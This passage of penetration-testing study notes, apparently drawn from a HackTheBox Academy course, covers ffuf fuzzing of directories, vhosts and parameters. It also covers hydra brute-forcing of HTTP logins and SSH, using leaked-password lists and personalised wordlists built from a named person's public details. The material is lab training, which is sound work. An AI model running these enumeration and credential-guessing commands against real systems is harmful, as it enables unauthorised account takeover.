	> We get a couple of hits; both have an HTTP code 200, meaning we can access them. index.php has a size of 0, indicating that it is an empty page, while the other does not, which means that it has content. We can visit any of these pages to verify this:


* Recursive Flags
	> When we scan recursively, it automatically starts another scan under any newly identified directories that may have on their pages until it has fuzzed the main website and all of its subdirectories.
	> Some websites may have a big tree of sub-directories, like /login/user/content/uploads/...etc, and this will expand the scanning tree and may take a very long time to scan them all. This is why it is always advised to specify a depth to our recursive scan, such that it will not scan directories that are deeper than that depth. Once we fuzz the first directories, we can then pick the most interesting directories and run another scan to direct our scan better.
	> In ffuf, we can enable recursive scanning with the -recursion flag, and we can specify the depth with the -recursion-depth flag. If we specify -recursion-depth 1, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like /login/user, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with -e .php
	> Note: we can still use `.php` as our page extension, as these extensions are usually site-wide.
	> Finally, we will also add the flag -v to output the full URLs. Otherwise, it may be difficult to tell which .php file lies under which directory.

* Recursive Scanning
	> Let us repeat the first command we used, add the recursion flags to it while specifying .php as our extension, and see what results we get:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
	> As we can see this time, the scan took much longer, sent almost six times the number of requests, and the wordlist doubled in size (once with .php and once without). Still, we got a large number of results, including all the results we previously identified, all with a single line of command.

[+] DNS Records
	> Once we accessed the page under /blog, we got a message saying Admin panel moved to academy.htb. If we visit the website in our browser, we get can’t connect to the server at www.academy.htb:
	> This is because the exercises we do are not public websites that can be accessed by anyone but local websites within HTB. Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local /etc/hosts file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.
	> If we visit the IP directly, the browser goes to that IP directly and knows how to connect to it. But in this case, we tell it to go to academy.htb, so it looks into the local /etc/hosts file and doesn't find any mention of it. It asks the public DNS about it (such as Google's DNS 8.8.8.8) and does not find any mention of it, since it is not a public website, and eventually fails to connect. So, to connect to academy.htb, we would have to add it to our /etc/hosts file. We can achieve that with the following command:
		m1l0js@htb[/htb]$ sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'
	> Now we can visit the website (don't forget to add the PORT in the URL) and see that we can reach the website:
	> However, we get the same website we got when we visit the IP directly, so academy.htb is the same domain we have been testing so far. We can verify that by visiting /blog/index.php, and see that we can access the page.
	> When we run our tests on this IP, we did not find anything about admin or panels, even when we did a full recursive scan on our target. So, in this case, we start looking for sub-domains under '*.academy.htb' and see if we find anything, which is what we will attempt in the next section.


[+] Sub-domain Fuzzing
	> In this section, we will learn how to use ffuf to identify sub-domains (i.e., *.website.com) for any website.

* Sub-domains
	> A sub-domain is any website underlying another domain. For example, https://photos.google.com is the photos sub-domain of google.com.
	> In this case, we are simply checking different websites to see if they exist by checking if they have a public DNS record that would redirect us to a working server IP. So, let's run a scan and see if we get any hits. Before we can start our scan, we need two things:
    		- A wordlist
    		- A target
	> Luckily for us, in the SecLists repo, there is a specific section for sub-domain wordlists, consisting of common words usually used for sub-domains. We can find it in /opt/useful/SecLists/Discovery/DNS/. In our case, we would be using a shorter wordlist, which is subdomains-top1million-5000.txt. If we want to extend our scan, we can pick a larger list.
	> As for our target, we will use hackthebox.eu as our target and run our scan on it. Let us use ffuf and place the FUZZ keyword in the place of sub-domains, and see if we get any hits:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/
	> We see that we do get a few hits back. We can verify that these are actual sub-domains by visiting one of them:
	> We see that indeed these are working sub-domains. Now, we can try running the same thing on academy.htb and see if we get any hits back:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/
	> We see that we do not get any hits back. Does this mean that there are no sub-domain under academy.htb? - No.
	> This means that there are no public sub-domains under academy.htb, as it does not have a public DNS record, as previously mentioned. Even though we did add academy.htb to our /etc/hosts file, we only added the main domain, so when ffuf is looking for other sub-domains, it will not find them in /etc/hosts, and will ask the public DNS, which obviously will not have them.


[+] Vhost Fuzzing
	> As we saw in the previous section, we were able to fuzz public sub-domains using public DNS records. However, when it came to fuzzing sub-domains that do not have a public DNS record or sub-domains under websites that are not public, we could not use the same method. In this section, we will learn how to do that with Vhost Fuzzing.
* Vhosts vs. Sub-domains
	> The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites.
	> VHosts may or may not have public DNS records.
	> In many cases, many websites would actually have sub-domains that are not public and will not publish them in public DNS records, and hence if we visit them in a browser, we would fail to connect, as the public DNS would not know their IP. Once again, if we use the sub-domain fuzzing, we would only be able to identify public sub-domains but will not identify any sub-domains that are not public.
	> This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.

* Vhosts Fuzzing
	> To scan for VHosts, without manually adding the entire wordlist to our /etc/hosts, we will be fuzzing HTTP headers, specifically the Host: header. To do that, we can use the -H flag to specify a header and will use the FUZZ keyword within it, as follows:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
		mail2                   [Status: 200, Size: 900, Words: 423, Lines: 56]
		dns2                    [Status: 200, Size: 900, Words: 423, Lines: 56]
		ns3                     [Status: 200, Size: 900, Words: 423, Lines: 56]
		dns1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
		lists                   [Status: 200, Size: 900, Words: 423, Lines: 56]
		webmail                 [Status: 200, Size: 900, Words: 423, Lines: 56]
		static                  [Status: 200, Size: 900, Words: 423, Lines: 56]
		web                     [Status: 200, Size: 900, Words: 423, Lines: 56]
		www1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
<...SNIP...>

We see that all words in the wordlist are returning 200 OK! This is expected, as we are simply changing the header while visiting http://academy.htb:PORT/. So, we know that we will always get 200 OK. However, if the VHost does exist and we send a correct one in the header, we should get a different response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.

[+] Filtering Results
	> So far, we have not been using any filtering to our ffuf, and the results are automatically filtered by default by their HTTP code, which filters out code 404 NOT FOUND, and keeps the rest. However, as we saw in our previous run of ffuf, we can get many responses with code 200. So, in this case, we will have to filter the results based on another factor, which we will learn in this section.
* Filtering
	> In this case, we cannot use matching, as we don't know what the response size from other VHosts would be. We know the response size of the incorrect results, which, as seen from the test above, is 900, and we can filter it out with -fs 900. Now, let's repeat the same previous command, add the above flag, and see what we get:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
		admin                   [Status: 200, Size: 0, Words: 1, Lines: 1]
	> We can verify that by visiting the page, and seeing if we can connect to it:
	> Note 1: Don't forget to add "admin.academy.htb" to "/etc/hosts".
	> Note 2: If your exercise has been restarted, ensure you still have the correct port when visiting the website.
	> We see that we can access the page, but we get an empty page, unlike what we got with academy.htb, therefore confirming this is indeed a different VHost. We can even visit https://admin.academy.htb:PORT/blog/index.php, and we will see that we would get a 404 PAGE NOT FOUND, confirming that we are now indeed on a different VHost.
	> Try running a recursive scan on admin.academy.htb, and see what pages you can identify.


[+] Parameter Fuzzing - GET
	> If we run a recursive ffuf scan on admin.academy.htb, we should find http://admin.academy.htb:PORT/admin/admin.php. If we try accessing this page, we see the following:
	> That indicates that there must be something that identifies users to verify whether they have access to read the flag. We did not login, nor do we have any cookie that can be verified at the backend. So, perhaps there is a key that we can pass to the page to read the flag. Such keys would usually be passed as a parameter, using either a GET or a POST HTTP request. This section will discuss how to fuzz for such parameters until we identify a parameter that can be accepted by the page.
	> Tip: Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.

* GET Request Fuzzing
	> Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a ? symbol, like:
    		http://admin.academy.htb:PORT/admin/admin.php?param1=key.
	> So, all we have to do is replace param1 in the example above with FUZZ and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt. With that, we can run our scan.
	> Once again, we will get many results back, so we will filter out the default response size we are getting.
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
	> We do get a hit back. Let us try to visit the page and add this GET parameter, and see whether we can read the flag now:
	> As we can see, the only hit we got back has been deprecated and appears to be no longer in use.

[+] Parameter Fuzzing - POST
	> The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request. Check out the Web Requests module to learn more about HTTP requests.
	> To fuzz the data field with ffuf, we can use the -d flag, as we saw previously in the output of ffuf -h. We also have to add -X POST to send POST requests.
	> Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".
	> So, let us repeat what we did earlier, but place our FUZZ keyword after the -d flag:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
	> As we can see this time, we got a couple of hits, the same one we got when fuzzing GET and another parameter, which is id. Let's see what we get if we send a POST request with the id parameter. We can do that with curl, as follows:
		m1l0js@htb[/htb]$ curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
		<div class='center'><p>Invalid id!</p></div>
	> As we can see, the message now says Invalid id!.

[+] Value Fuzzing
	> After fuzzing a working parameter, we now have to fuzz the correct value that would return the flag content we need. This section will discuss fuzzing for parameter values, which should be fairly similar to fuzzing for parameters, once we develop our wordlist.

* Custom Wordlist
	> When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, as each parameter would expect a certain type of value.
	> For some parameters, like usernames, we can find a pre-made wordlist for potential usernames, or we may create our own based on users that may potentially be using the website. For such cases, we can look for various wordlists under the seclists directory and try to find one that may contain values matching the parameter we are targeting. In other cases, like custom parameters, we may have to develop our own wordlist. In this case, we can guess that the id parameter can accept a number input of some sort. These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. We'll start with a wordlist containing all numbers from 1-1000.
	> There are many ways to create this wordlist, from manually typing the IDs in a file, or scripting it using Bash or Python. The simplest way is to use the following command in Bash that writes all numbers from 1-1000 to a file:
		m1l0js@htb[/htb]$ for i in $(seq 1 1000); do echo $i >> ids.txt; done
	> Once we run our command, we should have our wordlist ready:
	> Now we can move on to fuzzing for values.

* Value Fuzzing
	> Our command should be fairly similar to the POST command we used to fuzz for parameters, but our FUZZ keyword should be put where the parameter value would be, and we will use the ids.txt wordlist we just created, as follows:
		m1l0js@htb[/htb]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
	> We see that we get a hit right away. We can finally send another POST request using curl, as we did in the previous section, use the id value we just found, and collect the flag.

-=-=-==-=
#### Login brute forcing
	> An example of a brute-force attack is password cracking. Passwords are usually not stored in clear text on the systems but as hash values.
	> Here is a small list of files that can contain hashed passwords:
		Windows		Linux
		unattend.xml	shadow
		sysprep.inf	shadow.bak
		SAM		password
	> Since the password cannot be calculated backward from the hash value, the brute force method determines the hash values belonging to the randomly selected passwords until a hash value matches the stored hash value. In this case, the password is found. This method is also called offline brute-forcing. This module will focus on online brute-forcing and explicitly deal with the websites' login forms.
	> On most websites, there is always a login area for administrators, authors, and users somewhere. Furthermore, usernames are often recognizable on the web pages, and complex passwords are rarely used because they are difficult to remember. Therefore it is worth using the online brute forcing method after a proper enumeration if we could not identify any initial foothold.
	> There are many tools and methods to utilize for login brute-forcing, like:

    		- Ncrack
    		- wfuzz
    		- medusa
    		- patator
    		- hydra
    		- and others.
	> In this module, we will be mainly using hydra, as it is one of the most common and reliable tools available.

* Password Attacks
	> We found an unusual host on the network during our black box penetration test and had a closer look at it. We discovered a web server on it that is running on a non-standard port. Many web servers or individual contents on the web servers are still often used with the Basic HTTP AUTH scheme. Like in our case, we found such a webserver with such a path, which should arouse some curiosity.
	> The HTTP specification provides two parallel authentication mechanisms:
    		- Basic HTTP AUTH is used to authenticate the user to the HTTP server.
    		- Proxy Server Authentication is used to authenticate the user to an intermediate proxy server.
	> These two mechanisms work very similarly as they use requests, response status codes, and response headers. However, there are differences in the status codes and header names used.
	> The Basic HTTP Authentication scheme uses user ID and password for authentication. The client sends a request without authentication information with its first request. The server's response contains the WWW-Authenticate header field, which requests the client to provide the credentials. This header field also defines details of how the authentication has to take place. The client is asked to submit the authentication information. In its response, the server transmits the so-called realm, a character string that tells the client who is requesting the data. The client uses the Base64 method for encoding the identifier and password. This encoded character string is transmitted to the server in the Authorization header field.
	> As we don't have any credentials, nor do we have any other ports available, and no services or information about the webserver to be able to use or attack, the only option left is to utilize password brute-forcing.


	> There are several types of password attacks, such as:
		- Password Attack Type
		- Dictionary attack
		- Brute force
		- Traffic interception
		- Man In the Middle
		- Key Logging
		- Social engineering

	> We will mainly focus on Brute Force and Dictionary Attacks. Both of these attacks will find the password by brute forcing the service.

* Brute Force Attack
	> A Brute Force Attack does not depend on a wordlist of common passwords, but it works by trying all possible character combinations for the length we specified. For example, if we specify the password's length as 4, it would test all keys from aaaa to zzzz, literally brute forcing all characters to find a working password.
	> However, even if we only use lowercase English characters, this would have almost half a million permutations -26x26x26x26 = 456,976-, which is a huge number, even though we only have a password length of 4.
	> Once the password length starts to increase, and we start testing for mixed casings, numbers, and special characters, the time it would take to brute force, these passwords can take millions of years.
	> All of this shows that relying completely on brute force attacks is not ideal, and this is especially true for brute-forcing attacks that take place over the network, like in hydra.
	> That is why we should consider methods that may increase our odds of guessing the correct password, like Dictionary Attacks.

* Dictionary Attack
	> A Dictionary Attack tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. This method is useful whenever it can be assumed that passwords with reasonable character combinations are used.
	> Luckily, there is a huge number of passwords wordlist, consisting of the most commonly used passwords found in tests and database leaks.
	> We can check out the SecLists repo for wordlists, as it has a huge variety of wordlists, covering many types of attacks.
	> We can find password wordlists in our PwnBox in /opt/useful/SecLists/Passwords/, and username wordlists in /opt/useful/SecLists/Usernames/.

* Methods of Brute Force Attacks
	> There are many methodologies to carry a Login Brute Force attacks:
		- Attack 			Description
		- Online Brute Force Attack 	Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others
		- Offline Brute Force Attack 	Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password.
		- Reverse Brute Force Attack 	Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service.
		- Hybrid Brute Force Attack 	Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service.

* Default Passwords
	> Default passwords are often used for user accounts for testing purposes. They are easy to remember and are also used for default accounts of services and applications intended to simplify first access. It is not uncommon for such user accounts to be overlooked or forgotten. Due to the natural laziness of man, everyone tries to make it as comfortable as possible. This, in turn, leads to inattentiveness and the resulting errors, which can harm the company's infrastructure.
	> As we saw when we visited the website, it prompted the Basic HTTP Authentication form to input the username and password. Basic HTTP Authentication usually responses with an HTTP 401 Unauthorized response code. As we mentioned previously, we will resort to a Brute Forcing attack, as we do not have enough information to attempt a different type of attack, which we will cover in this section.
	> As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort.
	> It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. test:test-, and scan all of them first.
	> This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used.
	> We can find a list of default password login pairs in the SecLists repository as well, specifically in the /opt/useful/SecLists/Passwords/Default-Credentials directory within Pwnbox. In this case, we will pick ftp-betterdefaultpasslist.txt as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:
		Options 				Description
		-C ftp-betterdefaultpasslist.txt 	Combined Credentials Wordlist
		SERVER_IP 				Target IP
		-s PORT 				Target Port
		http-get 				Request Method
		/ 					Target Path

	> The assembled command results:
		m1l0js@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
	> It's pretty common for administrators to overlook test or default accounts and their credentials. That is why it is always advised to start by scanning for default credentials, as they are very commonly left unchanged. It is even worth testing for the top 3-5 most common default credentials manually, as it can very often be found to be used.


[+] Username Brute Force
	> We now know the basic usage of hydra, so let us try another example of attacking HTTP basic auth by using separate wordlists for usernames and passwords.

* Wordlists
	> One of the most commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are, collected from online leaked databases of passwords and usernames. Basically, unless a password is truly unique, this wordlist will likely contain it. Rockyou.txt already exists in our Pwnbox. If we were using hydra on a local VM, we could download this wordlist from the Hashcat GitHub Repository. We can find it in the following directory:
		/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
	> As for our usernames wordlist, we will utilize the following wordlist from SecLists:
		m1l0js@htb[/htb]$ locate names.txt
			/opt/useful/SecLists/Usernames/Names/names.txt

	> This is a short list of common usernames that may be found on any server.

* Username/Password Attack
	> Hydra requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:
    		- Credentials
    		- Target Host
    		- Target Path

	> Credentials can also be separated by usernames and passwords. We can use the -L flag for the usernames wordlist and the -P flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell hydra to stop after the first successful login by specifying the flag -f.
	> Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
		m1l0js@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

	> We see that we can still find the same working pair, but in this case, it took much longer to find them, taking nearly 30 minutes to do so. This is because while default passwords are commonly used together, they clearly are not among the top when it comes to individual wordlists. So, either the username or the password is buried deep into our wordlist, taking much longer to reach.

* Username Brute Force
	> If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the test user by adding -l test, and then adding a password word list with -P rockyou.txt.
	> Since we already found the password in the previous section, we may statically assign it with the "-p" flag, and only brute force for usernames that might use this password.
		m1l0js@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
			[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio


[+] Hydra Modules
	> Since we found a login form on the webserver for administrators during our penetration testing engagement, it is a very interesting component to which we should try to gain access without generating much network traffic. Finally, with the admin panels, we can manage servers, their services, and configurations. Many admin panels have also implemented features or elements such as the b374k shell(https://github.com/b374k/b374k) that might allow us to execute OS commands directly.

* Login.php
	> To cause as little network traffic as possible, it is recommended to try the top 10 most popular administrators' credentials, such as admin:admin.
	> If none of these credentials grant us access, we could next resort to another widespread attack method called password spraying. This attack method is based on reusing already found, guessed, or decrypted passwords across multiple accounts. Since we have been redirected to this admin panel, the same user may have access here.

* Brute Forcing Forms
	> Hydra provides many different types of requests we can use to brute force different services. If we use hydra -h, we should be able to list supported services:
		m1l0js@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

	> In this situation there are only two types of http modules interesting for us:
    		http[s]-{head|get|post}
    		http[s]-post-form

	> The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like .php or .aspx and others.
	> Since the file extension is ".php" we should try the http[s]-post-form module. To decide which module we need, we have to determine whether the web application uses GET or a POST form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form.
	> When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a POST form.
	> Based on the URL scheme at the beginning, we can determine whether this is an HTTP or HTTPS post-form. If our target URL shows http, in this case, we should use the http-post-form module.
	> To find out how to use the http-post-form module, we can use the "-U" flag to list the parameters it requires and examples of usage:

m1l0js@htb[/htb]$ hydra http-post-form -U

	> In summary, we need to provide three parameters, separated by :, as follows:
    		- URL path, which holds the login form
    		- POST parameters for username/password
    		- A failed/success login string, which lets hydra recognize whether the login attempt was successful or not
	> For the first parameter, we know the URL path is:
		/login.php
	> The second parameter is the POST parameters for username/passwords:
		/login.php:[user parameter]=^USER^&[password parameter]=^PASS^
	> The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a success string to look for.
		/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]

* Fail/Success String
	> To make it possible for hydra to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided.
	> We can specify two different types of analysis that act as a Boolean value.
		Type 		Boolean Value 	Flag
		Fail 		FALSE 		F=html_content
		Success 	TRUE 		S=html_content

	> If we provide a fail string, it will keep looking until the string is not found in the response. Another way is if we provide a success string, it will keep looking until the string is found in the response.
	> Since we cannot log in to see what response we would get if we hit a success, we can only provide a string that appears on the logged-out page to distinguish between logged-in and logged-out pages.
	> So, let's look for a unique string so that if it is missing from the response, we must have hit a successful login. This is usually set to the error message we get upon a failed login, like Invalid Login Details. However, in this case, it is a little bit trickier, as we do not get such an error message. So is it still possible to brute force this login form?
	> We can take a look at our login page and try to find a string that only shows in the login page, and not afterwards. For example, one distinct string is Admin Panel:
	> So, we may be able to use Admin Panel as our fail string. However, this may lead to false-positives because if the Admin Panel also exists in the page after logging in, it will not work, as hydra will not know that it was a successful login attempt.
	> A better strategy is to pick something from the HTML source of the login page.
	> What we have to pick should be very unlikely to be present after logging in, like the login button or the password field. Let's pick the login button, as it is fairly safe to assume that there will be no login button after logging in, while it is possible to find something like please change your password after logging in.
	> We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login:
  		<form name='login' autocomplete='off' class='form' action='' method='post'>
	> We see it in a couple of places as title/header, and we find our button in the HTML form shown above. We do not have to provide the entire string, so we will use <form name='login', which should be distinct enough and will probably not exist after a successful login.
	> So, our syntax for the http-post-form should be as follows:
		"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"

[+] Determine Login Parameters

	> We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.

* Using Browser
	> One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with [CTRL + SHIFT + E].
	> Once we do, we can simply try to login with any credentials (test:test) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data:

* Another option would be to used Copy > Copy as cURL, which would copy the entire cURL command, which we can use in the Terminal to repeat the same HTTP request:
	m1l0js@htb[/htb]$ curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'

* Using Burp Suite
	> In case we were dealing with a web page that sends many HTTP requests, it may be easier to use Burp Suite in order to go through all sent HTTP requests, and pick the ones we are interested in. To do that, we will first start BurpSuite from Application Dock at the bottom in Pwnbox, skip all the messages until the application starts, and then Click on the Proxy tab:

Now, all we will do is attempt a login with any username/password 'e.g. admin:admin', and go back to BurpSuite, to find the login request captured: FoxyProxy

Tip: If we find another request captured, we can click "Forward" until we reach our request from "/login.php".

* To use in a hydra http-post-form, we can take it as is, and replace the username/password we used admin:admin with ^USER^ and ^PASS^. The specification of our final target path should be as follows:
	"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

[+] Login Form Attacks
	> In our situation, we don't have any information about the existing usernames or passwords. Since we enumerated all available ports to us and we couldn't determine any useful information, we have the option to test the web application form for default credentials in combination with the http-post-form module.

* Default Credentials
	> Let's try to use the ftp-betterdefaultpasslist.txt list with the default credentials to test if one of the accounts is registered in the web application.
		m1l0js@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
	> As we can see, we were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.

* Password Wordlist
	> Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as admin, administrator, wpadmin, root, adm, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is admin. In this case, we specify this username for our next attempt to get access to the admin panel.
		m1l0js@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"


[+] Personalized Wordlists
	> To create a personalized wordlist for the user, we will need to collect some information about them. As our example here is a known public figure, we can check out their Wikipedia page or do a basic Google search to gather the necessary information. Even if this was not a known figure, we can still carry out the same attack and create a personalized wordlist for them. All we need to do is gather some information about them, which is discussed in detail in the Hashcat module, so feel free to check it out.

* CUPP
	> Many tools can create a custom password wordlist based on certain information. The tool we will be using is cupp, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with sudo apt install cupp or clone it from the Github repository(https://github.com/Mebus/cupp). Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows:
		m1l0js@htb[/htb]$ cupp -i

	> And as a result, we get our personalized password wordlist saved as william.txt.

* Password Policy
	> The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions:
    		8 characters or longer
    		contains special characters
    		contains numbers
	> So, we can remove any passwords that do not meet these conditions from our wordlist. Some tools would convert password policies to Hashcat or John rules, but hydra does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:
		sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
		sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
		sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
	> We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.

* Mangling
	> It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force.
	> Many great tools do word mangling and case permutation quickly and easily, like rsmangler(https://github.com/digininja/RSMangler) or The Mentalist(https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.
	> As a starting point, we will stick to the wordlist we have generated so far and not perform any mangling on it. In case our wordlist does not hit a successful login, we will go back to these tools and perform some mangling to increase our chances of guessing the password.
	> Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.

* Custom Username Wordlist
	> We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be b.gates or gates or bill, and many other potential variations. There are several methods to create the list of potential usernames, the most basic of which is simply writing it manually.
	> One such tool we can use is Username Anarchy(https://github.com/urbanadventurer/username-anarchy)
	> This tool has many use cases that we can take advantage of to create advanced lists of potential usernames. However, for our simply use case, we can simply run it and provide the first/last names as arguments, and forward the output into a file, as follows:
		./username-anarchy Bill Gates > bill.txt
	> We should finally have our username and passwords wordlists ready and we could attack the SSH server.

[+] Service Authentication Brute Forcing

* SSH Attack
	> The command used to attack a login service is fairly straightforward. We simply have to provide the username/password wordlists, and add service://SERVER_IP:PORT at the end. As usual, we will add the -u -f flags. Finally, when we run the command for the first time, hydra will suggest that we add the -t 4 flag for a max number of parallel attempts, as many SSH limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows:
		m1l0js@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
	> We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user b.gates. Now, we can attempt ssh-ing in using the credentials we got:
		m1l0js@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22

* FTP Brute Forcing
	> Once we are in, we can check out what other users are on the system:
		b.gates@bruteforcing:~$ ls /home
		b.gates  m.gates

	> We notice another user, m.gates. We also notice in our local recon that port 21 is open locally, indicating that an FTP must be available:
		b.gates@bruteforcing:~$ netstat -antp | grep -i list
